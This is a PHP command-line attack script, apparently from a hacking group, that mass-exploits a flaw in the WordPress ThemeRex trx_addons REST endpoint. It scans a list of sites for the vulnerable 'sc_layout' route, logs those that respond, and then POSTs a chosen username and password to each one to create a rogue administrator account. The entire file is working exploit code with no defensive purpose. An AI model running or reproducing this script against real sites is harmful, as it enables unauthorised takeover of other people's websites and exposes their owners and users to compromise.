<?php

echo "
 __  __     _                          
 \ \/ /__ _(_)                         
  >  </ _` | |                         
 /_/\_\__,_|_|     _ _         _       
 / __|_  _ _ _  __| (_)__ __ _| |_ ___ 
 \__ \ || | ' \/ _` | / _/ _` |  _/ -_)
 |___/\_, |_||_\__,_|_\__\__,_|\__\___|
      |__/                             
\n";
echo "# Author  : MarsHall\n";
echo "# Contact : syalpra@xaisyndicate.id\n";
echo "# Tools   : Wordpress ThemeRex Add Administrator\n\n";
echo "# Save As : ";
$save = trim(fgets(STDIN));
echo "> Username : ";
$user = trim(fgets(STDIN));
echo "> Password : ";
$pass = trim(fgets(STDIN));
echo "\n\n";
$list = file_get_contents("wp.txt");
$sl = explode("\n", $list);
touch("$save");

foreach($sl as $ht){
$url = "$ht/wp-json/trx_addons/v2/get/sc_layout?sc=print_r";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $hasil = curl_exec($ch);
    curl_close($ch);

preg_match("/HTTP\/1.1 200/i", $hasil, $sukses);
 
 if (!empty($sukses)){
      echo "[+] $ht => Vuln\n";
      $o = fopen("$save", 'a');
      fwrite($o,"$ht\n");
      fclose($o);
 } else {
 
      echo "[×] $ht => Not Vuln\n";
 }
 }


$list2 = file_get_contents("$save");
$sls = explode("\n", $list2);
touch("$save");

foreach($sls as $hz){
$up = array (
        'user_login' => $user,
        'user_pass' => $pass
              );    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$hz/wp-json/trx_addons/v2/get/sc_layout?sc=");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $up);
    $hasil = curl_exec($ch);
    curl_close($ch);

echo "\n# Target Vuln\n\n";
if ($hasil == '4'){
     echo "[+] $hz/wp-login.php => Created Account Success \n";
     echo "Username : $user\n";
     echo "Password : $pass\n";
  } else {
     echo "[+] $hz/wp-login.php => Created Account Failed \n";
     
  }
}